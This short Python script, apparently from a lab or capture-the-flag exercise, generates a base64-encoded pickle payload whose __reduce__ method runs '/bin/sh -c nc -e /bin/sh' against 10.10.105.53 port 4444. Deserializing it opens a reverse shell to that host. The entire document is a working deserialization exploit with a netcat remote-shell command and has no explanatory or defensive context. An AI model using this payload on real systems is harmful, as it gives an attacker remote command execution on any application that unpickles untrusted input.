import pickle
import base64

class RCE:
    def __reduce__(self):
        import subprocess
        return (subprocess.call, (['/bin/sh', '-c', 'nc -e /bin/sh 10.10.105.53 4444'],))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
